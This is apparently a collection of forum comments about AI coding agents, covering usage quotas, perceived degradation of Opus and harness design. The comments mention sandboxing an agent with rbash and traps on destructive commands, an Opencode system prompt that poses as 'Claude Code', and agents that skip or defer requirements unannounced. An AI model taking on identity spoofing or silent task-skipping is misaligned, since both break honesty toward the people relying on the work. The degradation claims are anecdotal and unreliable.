The ideas here aren’t novel because of prose style, they’re about a cognitive pattern that’s been discussed in neuroscience and software engineering long before LLMs existed.\n\nAlso, there’s a category error in assuming that “AI-generated” means “unexamined.” The whole argument is explicitly about separating **generation** from **judgment**. Using a tool to help structure or phrase an idea doesn’t remove the need to reason about it any more than using a formatter removes the need to understand code.\n\nIf the content is wrong, incomplete, or misleading, that’s worth criticizing. But dismissing it purely based on how it was written is just avoiding the substance of the argument.\n\nIronically, that’s the same mistake people make when they evaluate AI-written code by vibes instead of by tests.\n\nIf you don’t want to engage with the idea, that’s fine.

The other nuclear option is to set up rbash for the devcontainer's non-root user and set rbash as the IDE's terminal path with a mandatory password for sudo that's not stored anywhere the LLM can access.\n\nFor rbash, I like to create a separate git user for the LLM. It gets a terminal where it can do limited damage and its changes are tracked separately from mine. I get a terminal with a different user where I can do maximum damage... I was hoping for a more unified approach this time, but I'll probably go back to rbash. For anyone wanting to try this, make sure you restrict bash access and lockdown all the bash settings files.\n\nI don't know why anthropic's devcontainer docs don't talk about using basic Linux admin for this sort of problem...I consider myself fortunate that my backups have backups, and I had the trap already setup for the devastating commands. Recursive rm throws an ask the human error message. Now, no verify git commits have a you must address all issues without ignoring any issues error message.

Like literally do my work, including uploading to the web and even responding to comments under my guidance (though I don't do that because it burns tokens like crazy, so I still have SOME work to do), since most of my work are deliverable files or site updates. \n\nSince I started using this thing through the command line, people at work are starting to think I'm some kind of genius because of how much shit I'm getting done (and I'm not one). I just spend a lot of my day with half my screen monitoring my Claude Code interns for each project/deliverable, making decisions when needed, connecting an occasional API to let the thing make better decisions without me, and discussing how to optimize its outputs to save me even more time.\n\nThe 5x is an absurd value if you do any kind of white-collar knowledge work. I'd pay for the x20 and I'll probably have to at some point. I'm also paying for a few APIs I've connected to CC to make it better at the tasks I need (using something like gemini 2.5 pro for exploration as an agent saves an insane amount of context and it costs very little even under heavy usage).\n\nIf you take a look at usage tracking plugins, you'll see Anthropic is subsidizing the hell out of these plans for power users.

For codex though, unlike Claude and cli/code, the underlying model is auto in this mode, and for me this could be where the difference lies.\n\nI gave codex a complex task that ran for one hour and failed to pass the tests, but gave up. This took around 10% of my weekly usage, so I can infer codex on auto can run for around 600 minutes per week on a medium sized repo.\n\nI then paid for the £18 Claude plan and ran the exact same task on opus - it hit a 5 hour limit within around 10 minutes on my way to work (without completing the task) and so I immediately refunded through the help bot.\n\nLater, I refined the task spec after seeing where it was tripping up, and codex succeeded in 30 mins, using 6% of my quota.\n\nSo while I can't tell which model codex selected in each case, it completed a task in 1h30 using 16% of my quota - this was a notably difficult problem mind you, other requests are often under 10 min. Opus locked me out for 5 hours without completing the task, so for me the real productivity difference on the cheap plans appears quite large.",

I actually tried updating to latest Claude code hoping it will be better but i dont see any improvements.

Both Opus and Sonnet adhered to my lengthy procedures very well (Global Claude MD / Project Claude MD) \n\n\\* I did run it for a few weeks with massive progression on all fronts / projects I had - I was genuinely beyond impressed and that's why I bought two subs to run Opus on repeat all week. \n\n\\* Early this year, 'OPUS' (add question mark here), did break the same app we were working on, for weeks to unusable state within a week or two - started to defer automatically sprint items/deliverables, became more like Sonnet after lobotomy, stopped adhering to my procedures the same way it did, start almost limiting what it can do. (Almost as if told to not take too much on... - all settings \\[thinking / output tokens were always max\\])\n\n  \nLast year (towards the end of the last year, probably before the whole event of 2X Usage over christmas/new year) - all was right. Since then, I can see quite significant model degradation and I already cancelled one of my Max X20 PRO plans as this is weird. \n\n  \nI am getting the below based on simple procedures that were always followed by the model - 30%/40% of the Sprint Size I was able to run last year with very similar procedures, now skipping through bits, rushing through stuff, deferring my requirements with 0 information back until I ask, crazy stuff - I joined one of those conspiracy theorists to say that there is something shady happening on the other side without proper communication (and I GET THE point that Opus is expensive, and I am willing to pay for it, but not in instances when something is marketed in one way, works well at one point in time, and then few weeks/months later it turns out to behave completely differently - if they announced 500$ / month plan and guaranteed quality, I'd be in, currently I went from spending $400 -> $200 -> to questioning whether I Should keep any or start wrapping Codex 5.2 into the game.... crazy)",

I had canceled my 20x sub a while back when quality went to shit and switched to Codex, but got lured back by the free month promo and generally positive reviews on Opus 4.5.  Initially I was getting excellent performance and utilizing multiagent development pushes that worked pretty well, even if they always missed a number of issues, despite multiple audits of the planning phase with box Opus and Codex gpt-5.2 high or xhigh.  Now though Opus is almost unusable and seems to have gone back to chipmunk brain mode, frequently only thinking for < 1 min and spitting out suggestions that are shallow and show no signs of having examined the codebase or even claude.md file.  When pushed back on and asked to investigate code first it will do a slightly better job, but implementation of even small features now often requires 3-4 retries as it hallucinates function names, forgets basic date / time and database syntax that is documented clearly in the claude.md file.  Overall it has become a super frustrating model to work with and has significantly delayed development of the app I'm working on.\n\nI'm starting to switch my workflow back to Codex, which is frustrating since it can be slow AF and I also find it's output and summaries to be very dense and difficult to scan, which makes it difficult to understand what decisions it has made.  Not to mention Codex's git handling is horrendous and prone to data loss during multipronged development pushes if you don't leash it carefully.  Still, considering Opus' speed bonus disappears when every small function triggers multiple regressions and whack-a-mole bug fix sessions.\n\nI'm going to try clearing out some of the plugins and give me claude.md file a careful review, as maybe this is context bloat, but it feels more like they've reduced the thinking budget.  The killing off of ultrathink makes me wonder if they've put a ChatGPT style model picker / thinking budget picker (cheaper sonnet model?) that processes queries and then decides how much thinking budget to allow Opus for each prompt, rather than letting users decide.  I'm not buying that every prompt is getting maximum thinking allotment, given the quick and shallow responses I'm seeing from prompts that should trigger a deeper level of analysis.   \n  \nThoughts?",

It feels like a shell of its former self, barely remembers context, prose isn't as great. I haven't really changed what I'm doing and sometimes it'll just throw in whatever it wants despite my instructions. I often sit here and think, damn if it's doing this with simple writing tasks, i shudder to think what its doing to you coders/programmers/developers and pray that everyone is at least looking through what Claude churns out for ya'll.",

          "text": "I'm actually building a tool that incorporates coding agent tools, and have dug into the code of various agents. Opencode did something out of the gate that made me concerned. Its system prompt pretends to be a coding agent that is more well known, like \"You're Claude Code\". Problem? Nah! Whatever gets the best results. But, immediately after that, it had another system prompt that started with \"You're Opencode ...\".\n\nhttps://github.com/anomalyco/opencode/blob/dev/packages/opencode/src/session/system.ts\n\nLine 23 loads 'PROMPT_ANTHROPIC_SPOOF.txt', then 36 loads 'PROMPT_ANTHROPIC.txt', which is what results in a weird identity \"crisis\" right out of the gate.\n\nNot critical. Opencode works OK. My overall point, though, is coding agents are for the most part very simple beasts, and having dug deep on Roo, Opencode, and various others, you'd be amazed both by how not different they are, and how loose some of them can be with details like that.\n\n[Found this](https://github.com/google-gemini/gemini-cli/blob/b81fe6832589b13b0874f7bcb9f21cd211773a0a/packages/core/src/tools/edit.ts#L209) yesterday in Gemini-cli.\n\n```\n// This logic is ported from your Python implementation.\n```\n\nNote, it doesn't say \"our\", it says \"your\". Not that that means gemini-cli is bad, but it was at least in part vibe-ported from some Python implementation, and reviews happened to miss that nugget.\n\nClaude code is not open source, but you can ask it to give an overview of its system prompt and available tools. Surprise. It's pretty much the same as everything else. What separates them is attention/quality of tool implementation, and potentially strategy of context management, then prompting and some other secret sauce for the commercial ones. So far as I've seen, none of the open source ones have anything approaching \"secret sauce\". It's system prompt(s), agent tools, and that's it.",

It seemed like somebody thought that might help with the output somehow, and somebody else later changed the system prompt after it.\n\nHowever, were I creating that prompt and already saying 'You are Claude Code' I'd change the next like. Instead of 'You are OpenCode, the best coding agent on the planet.', just 'You are the best coding agent on the planet.' Giving it two names/identities right away may not hurt much, but I can't imagine it helps.\n\nIn any case, the main point was that a coding agent is mostly just the system prompt and a handful of tools. I did an analysis of opencode tools some time back, and they seemed similar enough to Roo, which was what we were originally using through its API, and some of the others that I looked at, to just model our updated agent on Roo's tools, as they were familiar. The new agent implementation is all LangChain/Graph, so much more transparent, but it's a BYOT situation (T for tools).\n\nAfter some time with Roo's tools, I'd say the devil is in the details. For example, their file search is limited to a specific number, but the description says nothing about that, so the model doesn't find out until it runs the tool, which ends with something like \"[limited to 100 results]'. Then the model has to adjust the approach, but that's a wasted call and context. Various other search tools have proven to be inflexible. When the model starts running terminal commands to find files instead of the \"find_files\" tool, it's a good hint. So, while most agents pretty much have the same set of tools, the performance of the agent overall can very much be variable depending on how those tools are implemented.\n\nSo, probably another look at the details of opencode tools, but the basic tool options are the same as other agents. I would be fairly surprised if they had a noticeably better design when compared with CC, but I can't say they don't. It's tough comparison also because I can get the CC schema, which does say a lot, but nothing about actual implementation.",

Used 20% of copilot in one go. Sonnet 4-5 was okay. I do need model to have vision support and be able to run without constant next continue gpt models were not able to do in opencode maybe user issue. Keep asking do go to next from todo. Maybe it is github subscription to waste requests or the superpower skill i installed. They need gemini yolo mode like.  I will prefer next time to use simple without skills then it wastes to much time in exploring as i get excited.\n\n\nGemini 3 pro worked well with gemini subscription. Copilot imo sucks bad in usage. I bought just to try with opencode. \n\n\nWant to use with claude subscription but cannot risk being banned and loosing work.\n\n\nAlso claude code soon is going out of npm just to keep their source code locked.\n\n\nOverall like opencode one interface for all subscriptions and models. Right now i am back to claude code for Claude models.\n\n\nHarness is just an interface agreed nicer one can make difference and open source should be supported. The main is model and prompt. Best code finding is actually embedding conversion but it is slow not many like it but it is the best for large code base. Cursor and gemini code assist extension uses it. \n\n\nI only like claude due to initial opus and coding otherwise value to money is gemini. It may change in future. I will move to that. \n\n\nOverall good work by opencode and community to be able to get this much attention. There are so many new exciting tools being released every day. Wish can try all. I did try every-code before open-code no affiliation was curious when i was paying for codex. It had a way you can spin agent with different model. To have hybrid solution by comparing all three but it was before opus 4-5 which made me ditch. ",

Users were documenting setups with 7+ servers consuming 67k+ tokens.\n\nIf you're making a MCP server\nThings are mostly the same, but the \"server instructions\" field becomes more useful with tool search enabled. It helps Claude know when to search for your tools, similar to skills\n\nIf you're making a MCP client\nWe highly suggest implementing the ToolSearchTool, you can find the docs here. We implemented it with a custom search function to make it work for Claude Code.\n\nWhat about programmatic tool calling?\nWe experimented with doing programmatic tool calling such that MCP tools could be composed with each other via code. While we will continue to explore this in the future, we felt the most important need was to get Tool Search out to reduce context usage.\nTell us what you think here or on Github as you see the ToolSearchTool work.",
